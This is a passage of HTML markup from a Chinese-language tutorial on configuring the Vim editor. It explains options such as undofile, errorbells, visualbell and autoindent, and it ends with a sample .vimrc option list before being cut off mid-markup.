class=\"crayon-v\">autochdir</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p><code>Vim</code> 自动维护编辑的历史记录，允许撤消更改。默认情况下，该历史记录仅在文件关闭之前有效。<code>Vim</code> 包含一个增强功能，使得即使在文件关闭后也可以维护撤消历史记录，这意味着即使在保存、关闭和重新打开文件后，也可以撤消之前的更改。历史记录文件是使用 <code>.un~</code> 扩展名保存的隐藏文件。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab66fbd21f8415071719\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nset undofile</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab66fbd21f8415071719-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab66fbd21f8415071719-1\"><span class=\"crayon-e\">set </span><span class=\"crayon-v\">undofile</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>错误信息响铃，只对错误信息起作用：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab66fbd21fc928931988\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nset errorbells</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab66fbd21fc928931988-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab66fbd21fc928931988-1\"><span class=\"crayon-e\">set </span><span class=\"crayon-v\">errorbells</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>如果你愿意，还可以设置错误视觉提示：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab66fbd21ff061082215\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nset visualbell</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab66fbd21ff061082215-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab66fbd21ff061082215-1\"><span class=\"crayon-e\">set </span><span class=\"crayon-v\">visualbell</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p></p>\n<h3 id=\"toc_8\">惊喜</h3>\n<p><code>Vim</code> 提供长格式和短格式命令，两种格式都可用于设置或取消选项配置。</p>\n<p><code>autoindent</code> 选项的长格式是：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab66fbd2202101475814\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nset autoindent</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab66fbd2202101475814-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab66fbd2202101475814-1\"><span class=\"crayon-e\">set </span><span class=\"crayon-v\">autoindent</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p><code>autoindent</code> 选项的短格式是：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab66fbd2205558336547\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nset ai</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab66fbd2205558336547-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab66fbd2205558336547-1\"><span class=\"crayon-e\">set </span><span class=\"crayon-v\">ai</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>要在不更改选项当前值的情况下查看其当前设置，可以在 <code>Vim</code> 的命令行上使用在末尾加上 <code>?</code> 的命令：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab66fbd2208859840539\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nset autoindent?</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab66fbd2208859840539-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab66fbd2208859840539-1\"><span class=\"crayon-e\">set </span><span class=\"crayon-v\">autoindent</span><span class=\"crayon-sy\">?</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>在大多数选项前加上 <code>no</code> 前缀可以取消或关闭选项：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab66fbd220b079470930\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nset noautoindent</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab66fbd220b079470930-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab66fbd220b079470930-1\"><span class=\"crayon-e\">set </span><span class=\"crayon-v\">noautoindent</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>可以为单独的文件配置选项，而不必修改全局配置文件。需要的话，请打开文件并输入 <code>:</code>，然后键入 <code>set</code>命令。这样的话，配置仅对当前的文件编辑会话有效。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/1e95aa06e28b8bad52276ecf7f3121c5.png\" alt=\"\"></p>\n<p>使用命令行获取帮助：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab66fbd220e480267291\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n:help autoindent</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab66fbd220e480267291-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab66fbd220e480267291-1\"><span class=\"crayon-o\">:</span><span class=\"crayon-e\">help </span><span class=\"crayon-v\">autoindent</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/09/2185972aa793a200947ea4be508b99b1.jpg\" alt=\"\"></p>\n<p>注意：此处列出的命令仅对 Linux 上的 Vim 7.4 版本和 Windows 上的 Vim 8.0 版本进行了测试。</p>\n<p>这些有用的命令肯定会增强您的 <code>Vim</code> 使用体验。你会推荐哪些其他有用的命令?</p>\n<h3 id=\"toc_9\">选项列表</h3>\n<p>复制该选项列表粘贴到 <code>.vimrc</code> 文件中：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab66fbd2212112459203\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n\" Indentation &amp; Tabs\r\nset autoindent\r\nset smartindent\r\nset tabstop=4\r\nset shiftwidth=4\r\nset expandtab\r\nset smarttab\r\n\" Display &amp; format\r\nset number\r\nset textwidth=80\r\nset wrapmargin=2\r\nset showmatch\r\n\" Search\r\nset hlsearch\r\nset incsearch\r\nset ignorecase\r\nset smartcase\r\n\" Browse &amp; Scroll\r\nset scrolloff=5\r\nset laststatus=2\r\n\" Spell\r\nset spell spelllang=en_us\r\n\" Miscellaneous\r\nset nobackup\r\nset noswapfile\r\nset autochdir\r\nset undofile\r\nset visualbell\r\nset errorbells</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab66fbd2212112459203-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab66fbd2212112459203-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab66fbd2212112459203-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab66fbd2212112459203-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab66fbd2212112459203-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab66fbd2212112459203-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab66fbd2212112459203-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab66fbd2212112459203-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5bab66fbd2212112459203-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab66fbd2212112459203-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5bab66fbd2212112459203-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab66fbd2212112459203-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5bab66fbd2212112459203-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab66fbd2212112459203-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5bab66fbd2212112459203-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab66fbd2212112459203-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5bab66fbd2212112459203-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab66fbd2212112459203-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5bab66fbd2212112459203-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab66fbd2212112459203-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5bab66fbd2212112459203-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab66fbd2212112459203-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5bab66fbd2212112459203-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab66fbd2212112459203-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5bab66fbd2212112459203-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab66fbd2212112459203-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5bab66fbd2212112459203-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab66fbd2212112459203-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-5bab66fbd2212112459203-29\">29</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab66fbd2212112459203-1\"><span class=\"crayon-s\">\" Indentation &amp; Tabs</span></div><div class=\"crayon-line crayon-striped-line\" 